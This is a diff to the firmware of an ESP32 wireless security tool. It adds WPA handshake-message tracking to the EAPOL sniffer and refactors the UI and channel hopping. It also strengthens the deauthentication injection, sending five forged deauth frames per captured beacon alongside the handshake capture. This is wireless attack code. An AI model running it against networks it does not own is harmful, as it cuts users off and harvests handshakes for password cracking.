+  int ap_index = -1;
+  char addr[] = "00:00:00:00:00:00";
+  char addr2[] = "00:00:00:00:00:00";
+  String essid = "";
+  String bssid = "";
   
   wifi_promiscuous_pkt_t *snifferPacket = (wifi_promiscuous_pkt_t*)buf;
   WifiMgmtHdr *frameControl = (WifiMgmtHdr*)snifferPacket->payload;
   wifi_pkt_rx_ctrl_t ctrl = (wifi_pkt_rx_ctrl_t)snifferPacket->rx_ctrl;
   int len = snifferPacket->rx_ctrl.sig_len;
 
-  String display_string = "";
 
   if (type == WIFI_PKT_MGMT)
   {
     len -= 4;
+    wifi_scan_obj.mgmt_frames++;
     int fctl = ntohs(frameControl->fctl);
     const wifi_ieee80211_packet_t *ipkt = (wifi_ieee80211_packet_t *)snifferPacket->payload;
     const WifiMgmtHdr *hdr = &ipkt->hdr;
+
+    // Do our counts
+    if (snifferPacket->payload[0] == 0x40) { // Probe request
+      wifi_scan_obj.req_frames++;
+      return;
+    }
+    else if (snifferPacket->payload[0] == 0x50) { // Probe response
+      wifi_scan_obj.resp_frames++;
+      return;
+    }
+    else if (snifferPacket->payload[0] == 0x80) { // Beacon
+      is_beacon = true;
+      wifi_scan_obj.beacon_frames++;
+      getMAC(addr, snifferPacket->payload, 10);
+      ap_index = wifi_scan_obj.checkMatchAP(addr);
+      if (ap_index < 0) { // Check for existing AP in list. Create if not found
+
+        if (snifferPacket->payload[37] > 0) {
+          for (int i = 0; i < snifferPacket->payload[37]; i++)
+            essid.concat((char)snifferPacket->payload[i + 38]);
+        }
+
+        bssid.concat(addr);
+
+        if (essid == "")
+          essid = bssid;
+
+        uint8_t security_type = wifi_scan_obj.getSecurityType(snifferPacket->payload, len);
+
+        AccessPoint ap;
+        ap.essid = essid;
+        ap.channel = snifferPacket->rx_ctrl.channel;
+        ap.bssid[0] = snifferPacket->payload[10];
+        ap.bssid[1] = snifferPacket->payload[11];
+        ap.bssid[2] = snifferPacket->payload[12];
+        ap.bssid[3] = snifferPacket->payload[13];
+        ap.bssid[4] = snifferPacket->payload[14];
+        ap.bssid[5] = snifferPacket->payload[15];
+        ap.selected = false;
+        ap.stations = new LinkedList<uint16_t>();
+        ap.has_msg_1 = false;
+        ap.has_msg_2 = false;
+        ap.has_msg_3 = false;
+        ap.has_msg_4 = false;
+        ap.beacon[0] = snifferPacket->payload[34];
+        ap.beacon[1] = snifferPacket->payload[35];
+        ap.sec = security_type;
+        ap.wps = false;
+        ap.packets = 0;
+        access_points->add(ap);
+      }
+    }
+    else if (snifferPacket->payload[0] == 0xC0) { // Deauth
+      wifi_scan_obj.deauth_frames++;
+      return;
+    }
+  } else {
+    wifi_scan_obj.data_frames++;
+  }
+
+  getMAC(addr, snifferPacket->payload, 10);
+  ap_index = wifi_scan_obj.checkMatchAP(addr);
+
+  if (ap_index < 0) {
+    getMAC(addr2, snifferPacket->payload, 4);
+    ap_index = wifi_scan_obj.checkMatchAP(addr2);
   }
 
   #ifdef HAS_SCREEN
@@ -9782,8 +9888,16 @@ void WiFiScan::eapolSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type)
     int buff = 0;
   #endif
 
+  // Get min/max rssi
+  if (snifferPacket->rx_ctrl.rssi < wifi_scan_obj.min_rssi)
+    wifi_scan_obj.min_rssi = snifferPacket->rx_ctrl.rssi;
+  
+  if (snifferPacket->rx_ctrl.rssi > wifi_scan_obj.max_rssi)
+    wifi_scan_obj.max_rssi = snifferPacket->rx_ctrl.rssi;
+
+  
   // Found beacon frame. Decide whether to deauth
-  if (send_deauth) {
+  if (wifi_scan_obj.send_deauth) {
     if (snifferPacket->payload[0] == 0x80) {    
       // Build packet
       
@@ -9802,7 +9916,8 @@ void WiFiScan::eapolSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type)
       wifi_scan_obj.deauth_frame_default[21] = snifferPacket->payload[15];      
     
       // Send packet
-      esp_wifi_80211_tx(WIFI_IF_AP, wifi_scan_obj.deauth_frame_default, sizeof(wifi_scan_obj.deauth_frame_default), false);
+      for (int i = 0; i < 5; i++)
+        esp_wifi_80211_tx(WIFI_IF_AP, wifi_scan_obj.deauth_frame_default, sizeof(wifi_scan_obj.deauth_frame_default), false);
       delay(1);
     }
 
@@ -9813,61 +9928,88 @@ void WiFiScan::eapolSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type)
 
   // Check for and apply filters
   if (filter) {
-    bool found = false;
-    int ap_index = -1;
-
-    char addr[] = "00:00:00:00:00:00";
-    getMAC(addr, snifferPacket->payload, 10);
-    ap_index = wifi_scan_obj.checkMatchAP(addr);
-
-    if (ap_index < 0) {
-      char addr2[] = "00:00:00:00:00:00";
-      getMAC(addr2, snifferPacket->payload, 4);
-      ap_index = wifi_scan_obj.checkMatchAP(addr2);
-    }
-
-    if ((ap_index < 0) || (!access_points->get(ap_index).selected))
+    if ((ap_index < 0) || (!access_points->get(ap_index).selected)) {
       return;
-
-    //Serial.println("Received frame for " + access_points->get(ap_index).essid + ". Processing...");   
+    }
   }
 
-  if (( (snifferPacket->payload[30] == 0x88 && snifferPacket->payload[31] == 0x8e)|| ( snifferPacket->payload[32] == 0x88 && snifferPacket->payload[33] == 0x8e) )){
-    num_eapol++;
-    Serial.println(F("Received EAPOL:"));
+  uint8_t handshake_msg = 0;
 
-    char addr[] = "00:00:00:00:00:00";
+  int eapol_offset = -1;
+
+  if (snifferPacket->payload[30] == 0x88 && snifferPacket->payload[31] == 0x8e)
+    eapol_offset = 32;
+  else if (snifferPacket->payload[32] == 0x88 && snifferPacket->payload[33] == 0x8e)
+    eapol_offset = 34;
+
+  if (eapol_offset > 0)
+  {
+    is_eapol = true;
+    wifi_scan_obj.eapol_frames++;
+    Serial.print(F("Received EAPOL: "));
+
     getMAC(addr, snifferPacket->payload, 10);
-    display_string.concat(addr);
 
-    int temp_len = display_string.length();
+    Serial.print(addr);
+    Serial.println();
 
-   #ifdef HAS_SCREEN
-      for (int i = 0; i < 40 - temp_len; i++)
-      {
-        display_string.concat(" ");
+    // Get the handshake sequence number
+    int key_info_offset = eapol_offset + 5;
+
+    if (key_info_offset + 1 < len)
+    {
+      uint16_t key_info = (snifferPacket->payload[key_info_offset] << 8) |
+                           snifferPacket->payload[key_info_offset + 1];
+
+      bool key_ack = key_info & (1 << 7);
+      bool key_mic = key_info & (1 << 8);
+      bool secure  = key_info & (1 << 9);
+
+      if ( key_ack && !key_mic && !secure ) {
+        handshake_msg = 1;
+        if (ap_index >= 0) {
+          AccessPoint temp_ap = access_points->get(ap_index);
+          temp_ap.has_msg_1 = true;
+          access_points->set(ap_index, temp_ap);
+        }
       }
-
-      Serial.print(F(" "));
-
-      #ifdef SCREEN_BUFFER
-        #ifndef HAS_ILI9341
-          display_obj.display_buffer->add(display_string);
-        #endif
-      #endif
-    #else
-      Serial.println(addr);    
-    #endif
+      else if ( !key_ack && key_mic && !secure ) {
+        handshake_msg = 2;
+        if (ap_index >= 0) {
+          AccessPoint temp_ap = access_points->get(ap_index);
+          temp_ap.has_msg_2 = true;
+          access_points->set(ap_index, temp_ap);
+        }
+      }
+      else if ( key_ack && key_mic && secure ) {
+        handshake_msg = 3;
+        if (ap_index >= 0) {
+          AccessPoint temp_ap = access_points->get(ap_index);
+          temp_ap.has_msg_3 = true;
+          access_points->set(ap_index, temp_ap);
+        }
+      }
+      else if ( !key_ack && key_mic && secure ) {
+        handshake_msg = 4;
+        if (ap_index >= 0) {
+          AccessPoint temp_ap = access_points->get(ap_index);
+          temp_ap.has_msg_4 = true;
+          access_points->set(ap_index, temp_ap);
+        }
+      }
+    }
   }
 
-  buffer_obj.append(snifferPacket, len);
+  if ((is_eapol) || (is_beacon))
+    buffer_obj.append(snifferPacket, len);
 }
 
-void WiFiScan::activeEapolSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type)
-{
+/*void WiFiScan::activeEapolSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
+  bool is_beacon = false;
+  bool is_eapol = false;
   extern WiFiScan wifi_scan_obj;
 
-  bool send_deauth = settings_obj.loadSetting<bool>(text_table4[5]);
+  //bool send_deauth = settings_obj.loadSetting<bool>(text_table4[5]);
   
   wifi_promiscuous_pkt_t *snifferPacket = (wifi_promiscuous_pkt_t*)buf;
   WifiMgmtHdr *frameControl = (WifiMgmtHdr*)snifferPacket->payload;
@@ -9885,6 +10027,7 @@ void WiFiScan::activeEapolSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t
   // Found beacon frame. Decide whether to deauth
 
   if (snifferPacket->payload[0] == 0x80) {   
+    is_beacon = true;
 
     // Do target stuff
     if (wifi_scan_obj.currentScanMode == WIFI_SCAN_ACTIVE_LIST_EAPOL) {
@@ -9941,13 +10084,15 @@ void WiFiScan::activeEapolSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t
 
 
   if (( (snifferPacket->payload[30] == 0x88 && snifferPacket->payload[31] == 0x8e)|| ( snifferPacket->payload[32] == 0x88 && snifferPacket->payload[33] == 0x8e) )){
+    is_eapol = true;
     num_eapol++;
     Serial.println(F("Received EAPOL:"));
 
   }
 
-  buffer_obj.append(snifferPacket, len);
-}
+  if ((is_beacon) || (is_eapol))
+    buffer_obj.append(snifferPacket, len);
+}*/
 
 bool WiFiScan::filterActive() {
   for (int i = 0; i < access_points->size(); i++) {
@@ -9967,32 +10112,39 @@ bool WiFiScan::filterActive() {
     // Do the touch stuff
     #ifdef HAS_ILI9341
       pressed = display_obj.updateTouch(&t_x, &t_y);
-      //pressed = display_obj.tft.getTouch(&t_x, &t_y);
     #endif
 
-    // Check buttons for presses
-    for (int8_t b = 0; b < BUTTON_ARRAY_LEN; b++)
-    {
-      if (pressed && display_obj.key[b].contains(t_x, t_y))
-      {
-        display_obj.key[b].press(true);
-      } else {
-        display_obj.key[b].press(false);
+    if (pressed) {
+      while(display_obj.updateTouch(&t_x, &t_y)) {
+
+
+        // Check buttons for presses
+        for (int8_t b = 0; b < BUTTON_ARRAY_LEN; b++)
+        {
+          if (pressed && display_obj.key[b].contains(t_x, t_y)) {
+            //display_obj.tft.fillCircle(t_x, t_y, 2, TFT_WHITE);
+            display_obj.key[b].press(true);
+            //Serial.println(b);
+          }
+          else
+            display_obj.key[b].press(false);
+        }
       }
+    } else {
+      for (int8_t b = 0; b < BUTTON_ARRAY_LEN; b++)
+        display_obj.key[b].press(false);
     }
 
     // Which buttons pressed
     for (int8_t b = 0; b < BUTTON_ARRAY_LEN; b++)
-    {  
-      if (display_obj.key[b].justReleased()) return b;
-    }
+      if (display_obj.key[b].justReleased())
+        return b;
     return -1;
   }
 #endif
 
 #ifdef HAS_SCREEN
-  void WiFiScan::eapolMonitorMain(uint32_t currentTime)
-  {  
+  /*void WiFiScan::eapolMonitorMain(uint32_t currentTime) {  
     for (x_pos = (11 + x_scale); x_pos <= 320; x_pos = x_pos)
     {
       currentTime = millis();
@@ -10005,7 +10157,7 @@ bool WiFiScan::filterActive() {
           int8_t b = this->checkAnalyzerButtons(currentTime);
   
           // Channel - button pressed
-          if (b == 4) {
+          if (b == CHAN_MINUS_INDEX) {
             if (set_channel > 1) {
               set_channel--;
               delay(70);
@@ -10018,7 +10170,7 @@ bool WiFiScan::filterActive() {
           }
   
           // Channel + button pressed
-          else if (b == 5) {
+          else if (b == CHAN_PLUS_INDEX) {
             if (set_channel < MAX_CHANNEL) {
               set_channel++;
               delay(70);
@@ -10029,10 +10181,16 @@ bool WiFiScan::filterActive() {
               //break;
             }
           }
-          else if (b == 6) {
+          else if (b == EXIT_BUTTON_INDEX) {
             this->StartScan(WIFI_SCAN_OFF);
             //display_obj.init();
             this->orient_display = true;
+            return;
+          }
+          else if (b == CHAN_HOP_INDEX) {
+            settings_obj.toggleSetting("ChanHop");
+            this->channel_hop = settings_obj.loadSetting<bool>("ChanHop");
+            display_obj.tftDrawChanHopButton(false, this->channel_hop);
             return;
           }
       //  }
@@ -10043,7 +10201,7 @@ bool WiFiScan::filterActive() {
         initTime = millis();
         y_pos_x = ((-num_eapol * (y_scale * 3)) + (HEIGHT_1 - 2)); // GREEN
         if (y_pos_x >= HEIGHT_1) {
-          Serial.println(F("Max EAPOL number reached. Adjusting..."));
+          //Serial.println(F("Max EAPOL number reached. Adjusting..."));
           num_eapol = 0;
         }
 
@@ -10090,10 +10248,9 @@ bool WiFiScan::filterActive() {
     display_obj.tftDrawExitScaleButtons();
     display_obj.tftDrawEapolColorKey(this->filterActive());
     display_obj.tftDrawGraphObjects(x_scale);
-  }
+  }*/
 
-  void WiFiScan::packetMonitorMain(uint32_t currentTime)
-  {
+  void WiFiScan::packetMonitorMain(uint32_t currentTime) {
     
     
     for (x_pos = (11 + x_scale); x_pos <= 320; x_pos = x_pos)
@@ -10104,46 +10261,11 @@ bool WiFiScan::filterActive() {
       y_pos_x = 0;
       y_pos_y = 0;
       y_pos_z = 0;
-      /*boolean pressed = false;
-      
-      uint16_t t_x = 0, t_y = 0; // To store the touch coordinates
-  
-      // Do the touch stuff
-      #ifdef HAS_ILI9341
-        pressed = display_obj.tft.getTouch(&t_x, &t_y);
-      #endif
-  
-      if (pressed) {
-        Serial.print("Got touch | X: ");
-        Serial.print(t_x);
-        Serial.print(" Y: ");
-        Serial.println(t_y);
-      }
-  
-  
-      // Check buttons for presses
-      for (uint8_t b = 0; b < BUTTON_ARRAY_LEN; b++)
-      {
-        if (pressed && display_obj.key[b].contains(t_x, t_y))
-        {
-          display_obj.key[b].press(true);
-        } else {
-          display_obj.key[b].press(false);
-        }
-      }*/
-      
-      // Which buttons pressed
-      //for (uint8_t b = 0; b < BUTTON_ARRAY_LEN; b++)
-      //{
-  
-      //  if (display_obj.key[b].justReleased())
-      //  {
-      //    do_break = true;
 
       int8_t b = this->checkAnalyzerButtons(currentTime);
           
           // X - button pressed
-          if (b == 0) {
+          if (b == X_MINUS_INDEX) {
             if (x_scale > 1) {
               x_scale--;
               delay(70);
@@ -10156,7 +10278,7 @@ bool WiFiScan::filterActive() {
             }
           }
           // X + button pressed
-          else if (b == 1) {
+          else if (b == X_PLUS_INDEX) {
             if (x_scale < 6) {
               x_scale++;
               delay(70);
@@ -10170,7 +10292,7 @@ bool WiFiScan::filterActive() {
           }
   
           // Y - button pressed
-          else if (b == 2) {
+          else if (b == Y_MINUS_INDEX) {
             if (y_scale > 1) {
               y_scale--;
               delay(70);
@@ -10185,7 +10307,7 @@ bool WiFiScan::filterActive() {
           }
   
           // Y + button pressed
-          else if (b == 3) {
+          else if (b == Y_PLUS_INDEX) {
             if (y_scale < 9) {
               y_scale++;
               delay(70);
@@ -10200,7 +10322,7 @@ bool WiFiScan::filterActive() {
           }
   
           // Channel - button pressed
-          else if (b == 4) {
+          else if (b == CHAN_MINUS_INDEX) {
             if (set_channel > 1) {
               set_channel--;
               delay(70);
@@ -10215,7 +10337,7 @@ bool WiFiScan::filterActive() {
           }
   
           // Channel + button pressed
-          else if (b == 5) {
+          else if (b == CHAN_PLUS_INDEX) {
             if (set_channel < MAX_CHANNEL) {
               set_channel++;
               delay(70);
@@ -10228,7 +10350,7 @@ bool WiFiScan::filterActive() {
               //break;
             }
           }
-          else if (b == 6) {
+          else if (b == EXIT_BUTTON_INDEX) {
             this->StartScan(WIFI_SCAN_OFF);
             this->orient_display = true;
             return;
@@ -10276,10 +10398,6 @@ bool WiFiScan::filterActive() {
     
         //delay(50);
       }
-  
-      #ifdef HAS_SD
-        sd_obj.main();
-      #endif
      
     }
     
@@ -10296,7 +10414,8 @@ bool WiFiScan::filterActive() {
 #endif
 
 void WiFiScan::changeChannel(int chan) {
-  this->set_channel = chan;
+  if (chan != -1)
+    this->set_channel = chan;
   esp_wifi_set_channel(this->set_channel, WIFI_SECOND_CHAN_NONE);
   delay(1);
   #ifdef HAS_SCREEN
@@ -10305,20 +10424,22 @@ void WiFiScan::changeChannel(int chan) {
   #endif
 }
 
-void WiFiScan::changeChannel()
-{
-  esp_wifi_set_channel(this->set_channel, WIFI_SECOND_CHAN_NONE);
-  delay(1);
-}
-
 // Function to cycle to the next channel
-void WiFiScan::channelHop(bool filtered, bool ranged)
-{
+void WiFiScan::channelHop(bool filtered, bool ranged) {
   bool channel_match = false;
   bool ap_selected = true;
 
   int top_chan = 0;
   int bot_chan = 0;
+
+  if ((!settings_obj.loadSetting<bool>("ChanHop")) &&
+      ((this->currentScanMode == WIFI_SCAN_AP) ||
+       (this->currentScanMode == WIFI_SCAN_PROBE) ||
+       (this->currentScanMode == WIFI_SCAN_DEAUTH) ||
+       (this->currentScanMode == WIFI_SCAN_EAPOL) ||
+       (this->currentScanMode == WIFI_SCAN_RAW_CAPTURE) ||
+       (this->currentScanMode == WIFI_SCAN_PACKET_RATE)))
+    return;
 
   if (!filtered) {
     #ifndef HAS_DUAL_BAND
@@ -10405,13 +10526,6 @@ void WiFiScan::channelHop(bool filtered, bool ranged)
   delay(1);
 }
 
-char* WiFiScan::stringToChar(String string) {
-  char buf[string.length() + 1] = {};
-  string.toCharArray(buf, string.length() + 1);
-
-  return buf;
-}
-
 void WiFiScan::addAnalyzerValue(int16_t value, int rssi_avg, int16_t target_array[], int array_size) {
   // Shift all elements up by one index
   for (int i = array_size - 1; i > 0; i--) {
@@ -10423,15 +10537,28 @@ void WiFiScan::addAnalyzerValue(int16_t value, int rssi_avg, int16_t target_arra
 
 void WiFiScan::signalAnalyzerLoop(uint32_t tick) {
   #ifdef HAS_SCREEN
+    if ((this->currentScanMode == BT_SCAN_ANALYZER) || 
+        (this->currentScanMode == WIFI_SCAN_CHAN_ANALYZER)) {
+      if (tick - this->initTime >= BANNER_TIME) {
+        this->initTime = millis();
+        this->addAnalyzerValue(this->_analyzer_value * BASE_MULTIPLIER, -72, this->_analyzer_values, TFT_WIDTH);
+        this->_analyzer_value = 0;
+        if (this->analyzer_name_update) {
+          this->displayAnalyzerString(this->analyzer_name_string);
+          this->analyzer_name_update = false;
+        }
+      }
+    }
+    
     #ifdef HAS_ILI9341
       int8_t b = this->checkAnalyzerButtons(millis());
 
-      if (b == 6) {
+      if (b == EXIT_BUTTON_INDEX) {
         this->StartScan(WIFI_SCAN_OFF);
         this->orient_display = true;
         return;
       }
-      else if (b == 4) {
+      else if (b == CHAN_MINUS_INDEX) {
         #ifndef HAS_DUAL_BAND
           if (set_channel > 1) {
             set_channel--;
@@ -10441,7 +10568,7 @@ void WiFiScan::signalAnalyzerLoop(uint32_t tick) {
             return;
           }
         #else
-          if (this->dual_band_channel_index > 1) {
+          if (this->dual_band_channel_index > 0) {
             this->dual_band_channel_index--;
             this->set_channel = this->dual_band_channels[this->dual_band_channel_index];
             display_obj.tftDrawChannelScaleButtons(this->set_channel, false);
@@ -10453,7 +10580,7 @@ void WiFiScan::signalAnalyzerLoop(uint32_t tick) {
       }
 
       // Channel + button pressed
-      else if (b == 5) {
+      else if (b == CHAN_PLUS_INDEX) {
         #ifndef HAS_DUAL_BAND
           if (set_channel < MAX_CHANNEL) {
             set_channel++;
@@ -10472,6 +10599,13 @@ void WiFiScan::signalAnalyzerLoop(uint32_t tick) {
             return;
           }
         #endif
+      }
+
+      else if (b == CHAN_HOP_INDEX) {
+        settings_obj.toggleSetting("ChanHop");
+        this->channel_hop = settings_obj.loadSetting<bool>("ChanHop");
+        display_obj.tftDrawChanHopButton(false, this->channel_hop);
+        return;
       }
     #endif
   #endif
@@ -10516,16 +10650,6 @@ void WiFiScan::drawChannelLine() {
 
 void WiFiScan::channelActivityLoop(uint32_t tick) {
   #ifdef HAS_SCREEN
-    /*if (tick - this->initTime >= BANNER_TIME) {
-      this->initTime = millis();
-      this->addAnalyzerValue(this->_analyzer_value * BASE_MULTIPLIER, -72, this->_analyzer_values, TFT_WIDTH);
-      this->_analyzer_value = 0;
-      if (this->analyzer_name_update) {
-        this->displayAnalyzerString(this->analyzer_name_string);
-        this->analyzer_name_update = false;
-      }
-    }*/
-
     if (tick - this->initTime >= BANNER_TIME * 50) {
       initTime = millis();
       Serial.println(F("--------------"));
@@ -10542,12 +10666,12 @@ void WiFiScan::channelActivityLoop(uint32_t tick) {
     #ifdef HAS_ILI9341
       int8_t b = this->checkAnalyzerButtons(millis());
 
-      if (b == 6) {
+      if (b == EXIT_BUTTON_INDEX) {
         this->StartScan(WIFI_SCAN_OFF);
         this->orient_display = true;
         return;
       }
-      else if (b == 4) {
+      else if (b == CHAN_MINUS_INDEX) {
         #ifndef HAS_DUAL_BAND
           if (this->activity_page > 1) {
             this->activity_page--;
@@ -10568,7 +10692,7 @@ void WiFiScan::channelActivityLoop(uint32_t tick) {
       }
 
       // Channel + button pressed
-      else if (b == 5) {
+      else if (b == CHAN_PLUS_INDEX) {
         #ifndef HAS_DUAL_BAND
           if (this->activity_page < MAX_CHANNEL / CHAN_PER_PAGE) {
             this->activity_page++;
@@ -10591,7 +10715,7 @@ void WiFiScan::channelActivityLoop(uint32_t tick) {
   #endif
 }
 
-void WiFiScan::channelAnalyzerLoop(uint32_t tick) {
+/*void WiFiScan::channelAnalyzerLoop(uint32_t tick) {
   #ifdef HAS_SCREEN
     if (tick - this->initTime >= BANNER_TIME) {
       this->initTime = millis();
@@ -10606,12 +10730,12 @@ void WiFiScan::channelAnalyzerLoop(uint32_t tick) {
     #ifdef HAS_ILI9341
       int8_t b = this->checkAnalyzerButtons(millis());
 
-      if (b == 6) {
+      if (b == EXIT_BUTTON_INDEX) {
         this->StartScan(WIFI_SCAN_OFF);
         this->orient_display = true;
         return;
       }
-      else if (b == 4) {
+      else if (b == CHAN_MINUS_INDEX) {
         #ifndef HAS_DUAL_BAND
           if (set_channel > 1) {
             set_channel--;
@@ -10633,7 +10757,7 @@ void WiFiScan::channelAnalyzerLoop(uint32_t tick) {
       }
 
       // Channel + button pressed
-      else if (b == 5) {
+      else if (b == CHAN_PLUS_INDEX) {
         #ifndef HAS_DUAL_BAND
           if (set_channel < MAX_CHANNEL) {
             set_channel++;
@@ -10655,7 +10779,7 @@ void WiFiScan::channelAnalyzerLoop(uint32_t tick) {
       }
     #endif
   #endif
-}
+}*/
 
 void WiFiScan::displayAnalyzerString(String str) {
   #ifdef HAS_SCREEN
@@ -10682,19 +10806,33 @@ void WiFiScan::renderRawStats() {
                             TFT_BLACK);
     display_obj.tft.setCursor(0, (STATUS_BAR_WIDTH * 2) + CHAR_WIDTH + EXT_BUTTON_WIDTH);
     display_obj.tft.setTextSize(1);
-    display_obj.tft.setTextColor(TFT_WHITE, TFT_BLACK);
+    display_obj.tft.setTextColor(TFT_CYAN, TFT_BLACK);
 
-    display_obj.tft.println(F("Stats\n"));
+    display_obj.tft.println(F("Stats"));
+
+    display_obj.tft.setTextColor(TFT_WHITE, TFT_BLACK);
 
     display_obj.tft.println("     Mgmt: " + (String)this->mgmt_frames);
     display_obj.tft.println("     Data: " + (String)this->data_frames);
-    display_obj.tft.println("  Channel: " + (String)this->set_channel);
     display_obj.tft.println("   Beacon: " + (String)this->beacon_frames);
     display_obj.tft.println("Probe Req: " + (String)this->req_frames);
     display_obj.tft.println("Probe Res: " + (String)this->resp_frames);
     display_obj.tft.println("   Deauth: " + (String)this->deauth_frames);
     display_obj.tft.println("    EAPOL: " + (String)this->eapol_frames);
+    if ((this->currentScanMode == WIFI_SCAN_EAPOL) ||
+        (this->currentScanMode == WIFI_SCAN_ACTIVE_EAPOL)) {
+      display_obj.tft.setTextColor(TFT_MAGENTA, TFT_BLACK);
+      display_obj.tft.println("Complete EAPOL: " + (String)this->getCompleteEapol());
+      display_obj.tft.setTextColor(TFT_WHITE, TFT_BLACK);
+    }
     display_obj.tft.println("     RSSI: " + (String)this->min_rssi + " - " + (String)this->max_rssi);
+    if (this->send_deauth) {
+    display_obj.tft.setTextColor(TFT_GREEN, TFT_BLACK);
+    display_obj.tft.println(F("\nDEAUTH TX: TRUE"));
+    } else {
+    display_obj.tft.setTextColor(TFT_RED, TFT_BLACK);
+    display_obj.tft.println(F("\nDEAUTH TX: FALSE"));
+    }
 
   #endif
 
@@ -10706,7 +10844,15 @@ void WiFiScan::renderRawStats() {
   Serial.println("Probe Res: " + (String)this->resp_frames);
   Serial.println("   Deauth: " + (String)this->deauth_frames);
   Serial.println("    EAPOL: " + (String)this->eapol_frames);
+  if ((this->currentScanMode == WIFI_SCAN_EAPOL) ||
+      (this->currentScanMode == WIFI_SCAN_ACTIVE_EAPOL)) {
+    Serial.println("Complete EAPOL: " + (String)this->getCompleteEapol());
+  }
   Serial.println("     RSSI: " + (String)this->min_rssi + " - " + (String)this->max_rssi);
+  if (this->send_deauth)
+  Serial.println(F("\nDEAUTH TX: TRUE"));
+  else
+  Serial.println(F("\nDEAUTH TX: FALSE"));
 }
 
 void WiFiScan::renderPacketRate() {
@@ -10742,11 +10888,13 @@ void WiFiScan::renderPacketRate() {
 }
 
 void WiFiScan::packetRateLoop(uint32_t tick) {
-  if (tick - this->initTime >= BANNER_TIME * 10) {
-    this->initTime = millis();
+  if (tick - this->last_ui_update >= BANNER_TIME * 10) {
+    this->last_ui_update = millis();
     if (this->currentScanMode == WIFI_SCAN_PACKET_RATE)
       this->renderPacketRate();
-    else if (this->currentScanMode == WIFI_SCAN_RAW_CAPTURE)
+    else if ((this->currentScanMode == WIFI_SCAN_RAW_CAPTURE) ||
+            (this->currentScanMode == WIFI_SCAN_EAPOL) ||
+            (this->currentScanMode == WIFI_SCAN_ACTIVE_EAPOL))
       this->renderRawStats();
 
   }
@@ -10754,30 +10902,58 @@ void WiFiScan::packetRateLoop(uint32_t tick) {
   #ifdef HAS_ILI9341
     int8_t b = this->checkAnalyzerButtons(millis());
 
-    if (b == 6) {
+    if (b == EXIT_BUTTON_INDEX) {
       this->StartScan(WIFI_SCAN_OFF);
       this->orient_display = true;
       return;
     }
-    else if (b == 4) {
-      if (set_channel > 1) {
-        set_channel--;
-        display_obj.tftDrawChannelScaleButtons(set_channel, false);
-        display_obj.tftDrawExitScaleButtons(false);
-        changeChannel();
-        return;
-      }
+    else if (b == CHAN_MINUS_INDEX) {
+      #ifndef HAS_DUAL_BAND
+        if (set_channel > 1) {
+          set_channel--;
+          display_obj.tftDrawChannelScaleButtons(set_channel, false);
+          display_obj.tftDrawExitScaleButtons(false);
+          changeChannel(set_channel);
+          return;
+        }
+      #else
+        if (this->dual_band_channel_index > 0) {
+          this->dual_band_channel_index--;
+          this->set_channel = this->dual_band_channels[this->dual_band_channel_index];
+          display_obj.tftDrawChannelScaleButtons(this->set_channel, false);
+          display_obj.tftDrawExitScaleButtons(false);
+          changeChannel(this->set_channel);
+          return;
+        }
+      #endif
     }
 
     // Channel + button pressed
-    else if (b == 5) {
-      if (set_channel < MAX_CHANNEL) {
-        set_channel++;
-        display_obj.tftDrawChannelScaleButtons(set_channel, false);
-        display_obj.tftDrawExitScaleButtons(false);
-        changeChannel();
-        return;
-      }
+    else if (b == CHAN_PLUS_INDEX) {
+      #ifndef HAS_DUAL_BAND
+        if (set_channel < MAX_CHANNEL) {
+          set_channel++;
+          display_obj.tftDrawChannelScaleButtons(set_channel, false);
+          display_obj.tftDrawExitScaleButtons(false);
+          changeChannel(set_channel);
+          return;
+        }
+      #else
+        if (this->dual_band_channel_index < DUAL_BAND_CHANNELS - 1) {
+          this->dual_band_channel_index++;
+          this->set_channel = this->dual_band_channels[this->dual_band_channel_index];
+          display_obj.tftDrawChannelScaleButtons(this->set_channel, false);
+          display_obj.tftDrawExitScaleButtons(false);
+          changeChannel(this->set_channel);
+          return;
+        }
+      #endif
+    }
+    else if (b == CHAN_HOP_INDEX) {
+      settings_obj.toggleSetting("ChanHop");
+      this->channel_hop = settings_obj.loadSetting<bool>("ChanHop");
+      display_obj.tftDrawChanHopButton(false, this->channel_hop);
+      return;
     }
   #endif
 }
@@ -11130,6 +11306,19 @@ void WiFiScan::updateTrackerUI() {
   }
 }
 
+void WiFiScan::displayTransmitRate() {
+  String displayString = "";
+  String displayString2 = "";
+  displayString.concat(text18);
+  displayString.concat(packets_sent);
+  for (int x = 0; x < STANDARD_FONT_CHAR_LIMIT; x++)
+    displayString2.concat(" ");
+  #ifdef HAS_SCREEN
+    display_obj.tft.setTextColor(TFT_GREEN, TFT_BLACK);
+    display_obj.showCenterText(displayString2, TFT_HEIGHT / 2);
+    display_obj.showCenterText(displayString, TFT_HEIGHT / 2);
+  #endif
+}
 
 // Function for updating scan status
 void WiFiScan::main(uint32_t currentTime)
@@ -11147,10 +11336,16 @@ void WiFiScan::main(uint32_t currentTime)
   (currentScanMode == WIFI_SCAN_STATION_WAR_DRIVE) ||
   (currentScanMode == WIFI_SCAN_ALL))
   {
-    if (currentTime - initTime >= this->channel_hop_delay * HOP_DELAY)
-    {
+    if (currentTime - initTime >= this->channel_hop_delay * HOP_DELAY) {
       initTime = millis();
       channelHop();
+    }
+    if ((currentScanMode == WIFI_SCAN_AP) || 
+        (currentScanMode == WIFI_SCAN_PROBE) ||
+        (currentScanMode == WIFI_SCAN_DEAUTH)){
+      #ifdef HAS_ILI9341
+        this->signalAnalyzerLoop(currentTime);
+      #endif
     }
   }
   else if (currentScanMode == WIFI_SCAN_SAE_COMMIT) {
@@ -11188,8 +11383,9 @@ void WiFiScan::main(uint32_t currentTime)
           (currentScanMode == BT_SCAN_FLOCK_WARDRIVE) ||
           (currentScanMode == BT_SCAN_WAR_DRIVE) ||
           (currentScanMode == BT_SCAN_WAR_DRIVE_CONT) ||
-          (currentScanMode == BT_SCAN_FLIPPER) || 
-          (currentScanMode == BT_SCAN_AIRTAG)) {
+          (currentScanMode == BT_SCAN_FLIPPER) ||
+          (currentScanMode == BT_SCAN_AIRTAG) ||
+          (currentScanMode == BT_SCAN_RAYBAN)) {
     if (currentTime - initTime >= this->channel_hop_delay * HOP_DELAY) {
       initTime = millis();
       #ifdef HAS_BT
